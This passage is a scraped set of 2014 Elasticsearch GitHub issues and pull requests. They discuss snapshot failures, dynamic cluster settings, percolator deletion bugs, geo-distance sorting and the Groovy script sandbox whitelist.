          "fields": {
            "subject": {
              "type": "string",
              "index": "analyzed"
            },
            "raw": {
              "type": "string",
              "index": "not_analyzed"
            }
          }
        }
      }
    }
  }
}

PUT /test/document/1
{
  "subject": "foo",
  "body": "bar"
}

GET /test/document/_search
```

returns:

```
{
   "took": 2,
   "timed_out": false,
   "_shards": {
      "total": 5,
      "successful": 5,
      "failed": 0
   },
   "hits": {
      "total": 1,
      "max_score": 1,
      "hits": [
         {
            "_index": "test",
            "_type": "document",
            "_id": "1",
            "_score": 1,
            "_source": {
               "body": "bar"
            }
         }
      ]
   }
}
```

I think it's the `index_template` that you've got at the beginning, which is stopping the mapping from working correctly.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Snapshotting NPE</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7099</link><project id="" key="" /><description>A snapshot run failed with `IndexShardSnapshotFailedException` caused by an NPE for a lot of shards:

```
[2014-07-30 18:11:56,063][WARN ][snapshots                ] [node.name] [[index.name][274]] [node.name:index.name] failed to create snapshot
org.elasticsearch.index.snapshots.IndexShardSnapshotFailedException: [index.name][274] null
        at org.elasticsearch.index.snapshots.blobstore.BlobStoreIndexShardRepository.snapshot(BlobStoreIndexShardRepository.java:141)
        at org.elasticsearch.index.snapshots.IndexShardSnapshotAndRestoreService.snapshot(IndexShardSnapshotAndRestoreService.java:86)
        at org.elasticsearch.snapshots.SnapshotsService$6.run(SnapshotsService.java:829)
        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)
        at java.lang.Thread.run(Thread.java:745)
Caused by: java.lang.NullPointerException
        at org.elasticsearch.index.snapshots.blobstore.BlobStoreIndexShardRepository$SnapshotContext.snapshot(BlobStoreIndexShardRepository.java:456)
        at org.elasticsearch.index.snapshots.blobstore.BlobStoreIndexShardRepository.snapshot(BlobStoreIndexShardRepository.java:131)
        ... 5 more
```

This is an index with 500 shards, snapshotting to an NFS mount.
</description><key id="39132933">7099</key><summary>Snapshotting NPE</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/imotov/following{/other_user}', u'events_url': u'https://api.github.com/users/imotov/events{/privacy}', u'organizations_url': u'https://api.github.com/users/imotov/orgs', u'url': u'https://api.github.com/users/imotov', u'gists_url': u'https://api.github.com/users/imotov/gists{/gist_id}', u'html_url': u'https://github.com/imotov', u'subscriptions_url': u'https://api.github.com/users/imotov/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/655851?v=4', u'repos_url': u'https://api.github.com/users/imotov/repos', u'received_events_url': u'https://api.github.com/users/imotov/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/imotov/starred{/owner}{/repo}', u'site_admin': False, u'login': u'imotov', u'type': u'User', u'id': 655851, u'followers_url': u'https://api.github.com/users/imotov/followers'}</assignee><reporter username="">shikhar</reporter><labels /><created>2014-07-30T20:22:03Z</created><updated>2014-09-29T14:44:28Z</updated><resolved>2014-07-31T04:43:22Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="imotov" created="2014-07-30T20:28:44Z" id="50674900">@shikhar which version of elasticsearch is it?
</comment><comment author="shikhar" created="2014-07-31T02:09:23Z" id="50705021">sorry i forgot to mention, it is 1.3.1

index also created with 1.3.1

On Thursday, July 31, 2014, Igor Motov notifications@github.com wrote:

&gt; @shikhar https://github.com/shikhar which version of elasticsearch is
&gt; it?
&gt; 
&gt; &#8212;
&gt; Reply to this email directly or view it on GitHub
&gt; https://github.com/elasticsearch/elasticsearch/issues/7099#issuecomment-50674900
&gt; .
</comment><comment author="shikhar" created="2014-07-31T04:43:22Z" id="50712036">@imotov I think this can be ignored, only seeing the issue on a cluster using custom discovery plugin and I've just identified a bug with it where older cluster state might clobber newer state.
</comment><comment author="tcompart" created="2014-09-02T13:22:31Z" id="54149800">We deploy a cluster across data centers with the standard zen discovery (unicast).

However, we encountered the same behaviour as mentioned above.
The snapshot API logs a response without failures and the status of the snapshot is PARTIAL.

Elasticsearch Version: 1.3.1
Java Version: 1.7.0_65

The following stack trace was logged:

&gt; [2014-09-02 03:05:00,100][WARN ][snapshots                ] [hostName01] [[indexName-247.1.4-0][1]] [indexName_backup:snapshot20140902_03:00:01] failed to create snapshot
&gt; org.elasticsearch.index.snapshots.IndexShardSnapshotFailedException: [indexName-247.1.4-0][1] null
&gt;   at org.elasticsearch.index.snapshots.blobstore.BlobStoreIndexShardRepository.snapshot(BlobStoreIndexShardRepository.java:141)
&gt;  at org.elasticsearch.index.snapshots.IndexShardSnapshotAndRestoreService.snapshot(IndexShardSnapshotAndRestoreService.java:86)
&gt;  at org.elasticsearch.snapshots.SnapshotsService$6.run(SnapshotsService.java:829)
&gt;  at org.elasticsearch.index.snapshots.blobstore.BlobStoreIndexShardRepository$SnapshotContext.snapshot(BlobStoreIndexShardRepository.java:456)
&gt;  at org.elasticsearch.index.snapshots.blobstore.BlobStoreIndexShardRepository.snapshot(BlobStoreIndexShardRepository.java:131)
&gt; [2014-09-02 03:08:26,748][INFO ][snapshots                ] [bereso01] snapshot [indexName_backup:snapshot20140902_03:00:01] is done
</comment><comment author="imotov" created="2014-09-02T13:34:09Z" id="54151615">@tcompart it turned out to be a different issue (#7376) that wasn't related to custom discovery plugin. It should be fixed in v1.3.3.
</comment><comment author="tcompart" created="2014-09-02T14:12:27Z" id="54157013">Ok thanks, than we will have to wait for the 1.3.3. We would hope to see this release online as soon as possible.
</comment><comment author="imotov" created="2014-09-02T14:17:35Z" id="54157775">@tcompart are you calling flush command explicitly around the time the snapshot is created?
</comment><comment author="tcompart" created="2014-09-03T15:04:55Z" id="54310861">@imotov We do not flush explicitly, but it might happen implicitly by lucene, because it indexes data into elastic search while creating the snapshot. (so you say, this happens but without our doing)
</comment><comment author="imotov" created="2014-09-04T13:14:55Z" id="54473333">@tcompart indeed it can happen because of automatic flush as well especially if you are indexing a lot of small records. I was just checking to see if I can offer a temporary workaround. 
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>[docs] Fix syntax on lang-analyzer</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7098</link><project id="" key="" /><description>Some of the language analyzer documentation contained invalid json.
</description><key id="39120851">7098</key><summary>[docs] Fix syntax on lang-analyzer</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">nik9000</reporter><labels /><created>2014-07-30T18:14:12Z</created><updated>2014-07-30T18:18:18Z</updated><resolved>2014-07-30T18:18:18Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-07-30T18:18:03Z" id="50657366">Thanks, merged.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Sorting: Allow _geo_distance to handle many to many geo point distance</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7097</link><project id="" key="" /><description>Add computation of disyance to many geo points. Example request:

```
{
  "sort": [
    {
      "_geo_distance": {
        "location": [
          {
            "lat":1.2,
            "lon":3
          },
          {
             "lat":1.2,
            "lon":3
          }
        ],
        "order": "desc",
        "unit": "km",
        "sort_mode": "max"
      }
    }
  ]
}
```

closes #3926
</description><key id="39114887">7097</key><summary>Sorting: Allow _geo_distance to handle many to many geo point distance</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">brwe</reporter><labels><label>:Search</label><label>feature</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-07-30T17:09:18Z</created><updated>2015-06-06T18:27:14Z</updated><resolved>2014-07-31T18:39:07Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="brwe" created="2014-07-31T11:50:38Z" id="50748394">Thanks for the quick feedback! I added commits for each comment.
</comment><comment author="jpountz" created="2014-07-31T13:23:05Z" id="50757496">LGTM

Could you please use the json builder instead of inlining json in tests? I find it hard to read with all the escaping that is required for new lines, quotes, etc. (if only java had multi-line strings). If you only change that part, feel free to push without asking me for another review.
</comment><comment author="brwe" created="2014-07-31T18:39:07Z" id="50800539">pushed to master fe86c8bc88a321bf587dd8eb4df52aaed9ed2156
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Validate repository settings</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7096</link><project id="" key="" /><description>As discussed in https://github.com/elasticsearch/elasticsearch-cloud-azure/issues/21, we need to let plugins validate repository settings.

So `BlobStoreRepository` could have a new protected method which could be overloaded by plugins or repository implementations, such as:

``` java
void validateRepositorySettings() throws RepositoryException;
```
</description><key id="39113472">7096</key><summary>Validate repository settings</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/imotov/following{/other_user}', u'events_url': u'https://api.github.com/users/imotov/events{/privacy}', u'organizations_url': u'https://api.github.com/users/imotov/orgs', u'url': u'https://api.github.com/users/imotov', u'gists_url': u'https://api.github.com/users/imotov/gists{/gist_id}', u'html_url': u'https://github.com/imotov', u'subscriptions_url': u'https://api.github.com/users/imotov/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/655851?v=4', u'repos_url': u'https://api.github.com/users/imotov/repos', u'received_events_url': u'https://api.github.com/users/imotov/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/imotov/starred{/owner}{/repo}', u'site_admin': False, u'login': u'imotov', u'type': u'User', u'id': 655851, u'followers_url': u'https://api.github.com/users/imotov/followers'}</assignee><reporter username="">dadoonet</reporter><labels><label>enhancement</label><label>v1.4.0</label><label>v2.0.0-beta1</label></labels><created>2014-07-30T16:53:15Z</created><updated>2015-03-19T15:03:25Z</updated><resolved>2014-10-07T14:54:54Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-09-10T12:25:36Z" id="55107432">@imotov I see a commit referenced here - didn't make it to a PR? Can you either push to 1.5 or open a PR?
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Make `cluster.routing.allocation.allow_rebalance` a dynamic setting</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7095</link><project id="" key="" /><description>Also makes it a static constant and changes all tests to use it instead
of a string.

Fixes #7092
</description><key id="39103368">7095</key><summary>Make `cluster.routing.allocation.allow_rebalance` a dynamic setting</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">dakrone</reporter><labels><label>:Settings</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-07-30T15:21:28Z</created><updated>2015-06-07T12:32:20Z</updated><resolved>2014-08-05T14:50:59Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="kimchy" created="2014-08-01T13:24:19Z" id="50883138">LGTM, can we have a generic static method on the enum to parse it from a string value, and share it between the code in the apply settings and the constructor?
</comment><comment author="dakrone" created="2014-08-01T14:33:31Z" id="50890989">@kimchy pushed another commit adding the static method
</comment><comment author="dakrone" created="2014-08-04T10:15:21Z" id="51042722">Pushed another commit to this that adds a custom `Validator` for the ClusterRebalanceAllocationDecider.
</comment><comment author="kimchy" created="2014-08-05T12:54:08Z" id="51192837">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Added a cli infrastructure</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7094</link><project id="" key="" /><description>CliTool is a base class for command-line interface tools (such as the plugin manager and potentially others). It supports the following:
- single or multi command tool
- help printing infrastructure (based on help files)
- consistent mechanism of parsing arguments (based on commons-cli lib)
- separation of argument parsing and command execution (for easier unit testing)
- terminal abstraction (will use System.console() when available)
</description><key id="39091413">7094</key><summary>Added a cli infrastructure</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">uboness</reporter><labels><label>:Internal</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-07-30T13:28:36Z</created><updated>2015-06-07T12:32:31Z</updated><resolved>2014-08-02T15:28:06Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="spinscale" created="2014-07-31T08:28:17Z" id="50731350">Left a few comments, mostly about the tests.

I like the idea a in general, a bit worried about the performance (didnt test anything, maybe I am plain wrong here), but I'd like to see the PluginManager adapted as part of this PR to make sure everything works as we expect and all features are covered instead of finding out later, that we cannot do everything needed with this.
</comment><comment author="uboness" created="2014-07-31T18:43:33Z" id="50801160">@spinscale thanks for the review... I'd like have the plugin manager implemented in a separate PR - its own PR as part of the work there is to change how it works (right now, aside from being a mess, it's also not consistent with its supported options).

If we find things missing in the infra, we can always add those later.
</comment><comment author="uboness" created="2014-08-02T04:30:58Z" id="50953681">updated based on comments by @spinscale 
- change help file resolution... command help file should now be named:

```
&lt;tool_name&gt;-&lt;cmd_name&gt;.help
```
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Allow multiple network binding</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7093</link><project id="" key="" /><description>As far as I understand NetworkService.java it is not possible to set multiple interfaces or IP listening, it's one or *.

I need to configure two interfaces or IP to bind ES.
</description><key id="39089819">7093</key><summary>Allow multiple network binding</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">asyd</reporter><labels><label>discuss</label></labels><created>2014-07-30T13:09:22Z</created><updated>2014-10-31T10:35:25Z</updated><resolved>2014-10-31T10:35:25Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-10-31T10:35:25Z" id="61243146">Fixed by #8098
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Bug: cluster.routing.allocation.allow_rebalance seems to be ignored</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7092</link><project id="" key="" /><description>In v1.1.1, when trying to update the `cluster.routing.allocation.allow_rebalance` setting, nothing seems to happen: neither in the elasticsearch log, nor on the request feedback:

``` json
&#9889; curl -XPUT 0:9200/_cluster/settings\?pretty -d '
{
  "persistent": {
    "cluster.routing.allocation.allow_rebalance": "indices_all_active",
    "cluster.routing.allocation.enable": "none",
    "cluster.routing.allocation.cluster_concurrent_rebalance": 2
  }
}
'
{
  "acknowledged" : true,
  "persistent" : {
    "cluster" : {
      "routing" : {
        "allocation" : {
          "enable" : "none",
          "cluster_concurrent_rebalance" : "2"
        }
      }
    }
  },
  "transient" : { }
}
```

In the server log:

```
[2014-07-30 14:32:16,797][INFO ][cluster.routing.allocation.decider] [node] updating [cluster.routing.allocation.cluster_concurrent_rebalance] from [4], to [2]
[2014-07-30 14:32:16,797][INFO ][cluster.routing.allocation.decider] [node] updating [cluster.routing.allocation.enable] from [PRIMARIES] to [NONE]

```
</description><key id="39087688">7092</key><summary>Bug: cluster.routing.allocation.allow_rebalance seems to be ignored</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/dakrone/following{/other_user}', u'events_url': u'https://api.github.com/users/dakrone/events{/privacy}', u'organizations_url': u'https://api.github.com/users/dakrone/orgs', u'url': u'https://api.github.com/users/dakrone', u'gists_url': u'https://api.github.com/users/dakrone/gists{/gist_id}', u'html_url': u'https://github.com/dakrone', u'subscriptions_url': u'https://api.github.com/users/dakrone/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/19060?v=4', u'repos_url': u'https://api.github.com/users/dakrone/repos', u'received_events_url': u'https://api.github.com/users/dakrone/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/dakrone/starred{/owner}{/repo}', u'site_admin': False, u'login': u'dakrone', u'type': u'User', u'id': 19060, u'followers_url': u'https://api.github.com/users/dakrone/followers'}</assignee><reporter username="">faxm0dem</reporter><labels><label>enhancement</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-07-30T12:41:21Z</created><updated>2014-08-06T08:13:30Z</updated><resolved>2014-08-05T14:50:59Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-07-30T12:56:05Z" id="50610063">I don't follow.  It appears that your settings have been accepted?
</comment><comment author="faxm0dem" created="2014-07-30T13:03:54Z" id="50610932">Look again: client and server feedback are present for `enable` and `cluster_concurrent_rebalance`, but none for `allow_rebalance`. And looking at the cluster's behaviour, it's not taking it into account.
On a sidenote, if I try to update an invalid setting, I get no error, e.g. `cluster.routing.allocation.foo`:

``` json
$ curl -XPUT 0:9200/_cluster/settings\?pretty -d '{"transient":{"cluster.routing.allocation.foo":"bar"}}'
{
  "acknowledged" : true,
  "persistent" : { },
  "transient" : { }
}
```
</comment><comment author="clintongormley" created="2014-07-30T14:12:08Z" id="50619461">Ah apologies - missed that in the long line. I've reformatted the initial request to make it easier to read.

Looks like it isn't a dynamic setting, but probably should be.

/cc @dakrone ?
</comment><comment author="dakrone" created="2014-07-30T14:15:24Z" id="50619926">Sure, I can make this dynamic.
</comment><comment author="faxm0dem" created="2014-07-30T14:29:56Z" id="50622009">oh! _that_ was the reason. two suggestions then:
1. make it clear in the documentation as to what is dynamic and what isn't
2. throw an error both in logfile and in response when submitting an invalid setting

Thanks
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Pass down the types from the delete mapping request to the delete by query request</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7091</link><project id="" key="" /><description>The `.percolator` type is a hidden type and therefor the types from the delete mapping request should passed down to the delete by query request, otherwise the percolator type gets ignored and the percolator queries don't get deleted from disk (only unregistered).

Closes #7087
</description><key id="39087320">7091</key><summary>Pass down the types from the delete mapping request to the delete by query request</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">martijnvg</reporter><labels><label>:Percolator</label><label>bug</label><label>v1.3.2</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-07-30T12:36:42Z</created><updated>2015-06-07T19:13:35Z</updated><resolved>2014-08-11T15:49:10Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="jpountz" created="2014-08-11T08:32:34Z" id="51753849">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Increase `UnicastZenPing.LIMIT_PORTS_COUNT` to `2`</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7090</link><project id="" key="" /><description>As described in https://github.com/elasticsearch/elasticsearch-cloud-aws/issues/99, we should increase `UnicastZenPing.LIMIT_PORTS_COUNT` to `2` instead of `1` today.

It should be a modifiable setting in case of users needs to run more instances on the same physical box, for example 2 data nodes on a 128gb RAM machine, one client node and one master only node.
</description><key id="39085164">7090</key><summary>Increase `UnicastZenPing.LIMIT_PORTS_COUNT` to `2`</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">dadoonet</reporter><labels><label>adoptme</label><label>enhancement</label><label>low hanging fruit</label></labels><created>2014-07-30T12:02:40Z</created><updated>2015-05-20T21:05:40Z</updated><resolved>2015-05-20T21:05:39Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="jerry4" created="2015-03-27T06:20:42Z" id="86840897">Is there any progress on merging this change in? I'm in a scenario where I want to run several staging clusters on the same box. The first one is the only one that can be discovered since it takes the default first port. Seems like this change would allow me to specify the number of clusters running on a single box so my clients can check multiple ports. Should add current works fine on my pc with multicast, but doesn't work on ec2 since multicast is not an option.
</comment><comment author="dadoonet" created="2015-05-20T21:05:39Z" id="104039062">Closing in favor of #8833.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>add groovy.util.GroovyCollections to the default receiver_whitelist</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7089</link><project id="" key="" /><description>It provides helper utilities, see: http://groovy.codehaus.org/api/groovy/util/GroovyCollections.html
</description><key id="39080554">7089</key><summary>add groovy.util.GroovyCollections to the default receiver_whitelist</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/dakrone/following{/other_user}', u'events_url': u'https://api.github.com/users/dakrone/events{/privacy}', u'organizations_url': u'https://api.github.com/users/dakrone/orgs', u'url': u'https://api.github.com/users/dakrone', u'gists_url': u'https://api.github.com/users/dakrone/gists{/gist_id}', u'html_url': u'https://github.com/dakrone', u'subscriptions_url': u'https://api.github.com/users/dakrone/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/19060?v=4', u'repos_url': u'https://api.github.com/users/dakrone/repos', u'received_events_url': u'https://api.github.com/users/dakrone/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/dakrone/starred{/owner}{/repo}', u'site_admin': False, u'login': u'dakrone', u'type': u'User', u'id': 19060, u'followers_url': u'https://api.github.com/users/dakrone/followers'}</assignee><reporter username="">dakrone</reporter><labels><label>enhancement</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-07-30T10:47:56Z</created><updated>2014-08-13T12:48:29Z</updated><resolved>2014-08-13T12:48:29Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments /><attachments /><subtasks /><customfields /></item><item><title>Odd script config behavior</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7088</link><project id="" key="" /><description>Just upgraded from `1.2.1` with the groovy plugin to `1.3.1` (plugin removed) and I'm seeing some weird behaviour when trying to use my installed scripts, I've written a [test script here](https://gist.github.com/mal/68bd3479e30258d833e2).

**Settings**

```
script.disable_dynamic: true
```

**Query**

``` json
{
  "script_fields": {
    "minimum": {
      "lang": "groovy",
      "script": "lowest",
      "params": {
        "field": "vals"
      }
    }
  }
}
```

**Script**

``` groovy
GroovyCollections.min(doc[field].values as Integer[])
```

**Results**

```
ScriptException[dynamic scripting for [groovy] disabled]
```

Which, while true, shouldn't apply since I'm trying to run a script stored on disk ...
</description><key id="39077617">7088</key><summary>Odd script config behavior</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/dakrone/following{/other_user}', u'events_url': u'https://api.github.com/users/dakrone/events{/privacy}', u'organizations_url': u'https://api.github.com/users/dakrone/orgs', u'url': u'https://api.github.com/users/dakrone', u'gists_url': u'https://api.github.com/users/dakrone/gists{/gist_id}', u'html_url': u'https://github.com/dakrone', u'subscriptions_url': u'https://api.github.com/users/dakrone/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/19060?v=4', u'repos_url': u'https://api.github.com/users/dakrone/repos', u'received_events_url': u'https://api.github.com/users/dakrone/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/dakrone/starred{/owner}{/repo}', u'site_admin': False, u'login': u'dakrone', u'type': u'User', u'id': 19060, u'followers_url': u'https://api.github.com/users/dakrone/followers'}</assignee><reporter username="">mal</reporter><labels><label>docs</label></labels><created>2014-07-30T10:05:05Z</created><updated>2014-08-13T12:48:29Z</updated><resolved>2014-08-13T12:48:29Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="dakrone" created="2014-07-30T10:29:54Z" id="50598308">Hi @mal,

I'm trying to reproduce this issue with your example, I actually get a different exception due to `GroovyCollections` not being allowed by the groovy sandbox. Is it possible that you are running mixed versions of Elasticsearch in your environment?

Can you give me the full stacktrace of the exception?

Also, when you put the script in `config/scripts`, do you see the log message about the script being compiled by Elasticsearch?
</comment><comment author="mal" created="2014-07-30T10:41:41Z" id="50599183">Aha, it fails to compile so I guess it doesn't get found and ES assumes `lowest` is a dynamic script.

```
[2014-07-30 11:36:37,180][WARN ][script                   ] [Honcho] failed to load/compile script [lowest]
org.elasticsearch.script.groovy.GroovyScriptCompilationException: MultipleCompilationErrorsException[startup failed:
General error during canonicalization: Method calls not allowed on [groovy.util.GroovyCollections]
```

I tried adding `groovy.util.GroovyCollections` to the `receiver_whitelist`, but that didn't work either:

```
[2014-07-30 11:39:53,907][WARN ][script                   ] [Heart Attack] failed to load/compile script [lowest]
org.elasticsearch.script.groovy.GroovyScriptCompilationException: MultipleCompilationErrorsException[startup failed:
General error during canonicalization: Property access not allowed on [java.lang.Object]
```
</comment><comment author="dakrone" created="2014-07-30T10:43:31Z" id="50599310">&gt; I tried adding groovy.util.GroovyCollections to the receiver_whitelist, but that didn't work either:

How did you add it to the `receiver_whitelist`? I can try to reproduce it.

Also, going forward, looking at the javadoc I don't see any reason why `GroovyCollections` shouldn't be part of the default whitelist, so I will open a separate issue to add that.
</comment><comment author="mal" created="2014-07-30T10:44:25Z" id="50599393">I added the following line to `elasticsearch.yml`:

```
script.groovy.sandbox.receiver_whitelist: groovy.util.GroovyCollections
```
</comment><comment author="dakrone" created="2014-07-30T10:47:32Z" id="50599603">@mal ahh okay, this is because the whitelist has to be entirely enumerated (it replaces the default whitelist, doesn't add to it), so adding that line removed the other whitelisted classes (like `Object`).

See: https://github.com/elasticsearch/elasticsearch/blob/b43b56a6a85f7dd131086fd83dc9267aecbbf0a3/src/main/java/org/elasticsearch/script/groovy/GroovySandboxExpressionChecker.java#L90-L111

I think this does need to be clarified in the docs, and it would be nice to have the functionality of both (replacing and adding to the whitelist).
</comment><comment author="dakrone" created="2014-07-30T10:48:25Z" id="50599673">Opened #7089 for adding the `GroovyCollections` class to the whitelist.
</comment><comment author="mal" created="2014-07-30T10:52:50Z" id="50600002">Ahh ok, is there any disadvantage to disabling the sandbox given dynamic scripting is already off and that an attacker would already need root access to edit installed scripts? If not I'll probably just do that for now.

Thanks for your help!
</comment><comment author="dakrone" created="2014-07-30T10:53:51Z" id="50600088">&gt; Ahh ok, is there any disadvantage to disabling the sandbox given dynamic scripting is already off and that an attacker would already need root access to edit installed scripts? If not I'll probably just do that for now.

Yea, you can do this, disable the sandbox and since dynamic scripting is disabled by default, you'll just have to put it on disk.

I'll treat this issue as an issue to update the docs, thanks for the report!
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Strange behavior after .percolator type deletion</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7087</link><project id="" key="" /><description>ES version: 1.1.1

When I remove all percolators and create new, deleted percolators are resurrected.

My test:
1. Create empty index:
   
   curl -XPUT myhost:9200/myemptyindex
2. Create two percolators:  

curl -XPUT myhost:9200/myemptyindex/.percolator/1 -d '{query:{match:{t:1}}}'

curl -XPUT myhost:9200/myemptyindex/.percolator/2 -d '{query:{match:{t:2}}}'
1. Delete all percolators:

curl -XDELETE myhost:9200/myemptyindex/.percolator
1. Check deletion:

curl -XGET myhost:9200/myemptyindex/.percolator/_search

No percolators found.
1. Create new percolator:

curl -XPUT myhost:9200/myemptyindex/.percolator/3 -d '{query:{match:{t:3}}}'
1. Get all percolators:

curl -XGET myhost:9200/myemptyindex/.percolator/_search

I see deleted percolators (1,2) are resurrected, it is incorrect.

I think it may be depended on percolators caching or something like that.
</description><key id="39066709">7087</key><summary>Strange behavior after .percolator type deletion</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">hovsep</reporter><labels><label>bug</label></labels><created>2014-07-30T07:24:05Z</created><updated>2014-08-11T15:49:10Z</updated><resolved>2014-08-11T15:49:10Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-07-30T10:35:34Z" id="50598732">HI @hovsep 

Yes, this is a known bug.  Deleting a type deletes the documents within the type using delete-by-query, which doesn't unregister the in-memory percolators.

See #7052 
</comment><comment author="clintongormley" created="2014-07-30T10:36:03Z" id="50598775">Depends on #7052
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>ClusterBlockException cannot be caught for bulk request when using node client</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7086</link><project id="" key="" /><description>When the cluster is in the ClusterBlockException state (Eg. not enough master to meet min master nodes), the ClusterBlockException cannot be caught for a bulk request when using node client:

``` java
 BulkRequestBuilder brb = client.prepareBulk();
            XContentBuilder builder = XContentFactory.jsonBuilder().startObject().field("bfield1", "bvalue1").endObject();
            String jsonString = builder.string();
            IndexRequestBuilder irb = client.prepareIndex(INDEX_NAME,TYPE_NAME,"b1");
            irb.setSource(jsonString);
            brb.add(irb);
            BulkResponse bulkResponse = brb.execute().actionGet();
```

Returns the exception:

```
Exception in thread "elasticsearch[client_node][generic][T#4]" org.elasticsearch.cluster.block.ClusterBlockException: blocked by: [SERVICE_UNAVAILABLE/1/state not recovered / initialized];[SERVICE_UNAVAILABLE/2/no master];
    at org.elasticsearch.cluster.block.ClusterBlocks.globalBlockedException(ClusterBlocks.java:138)
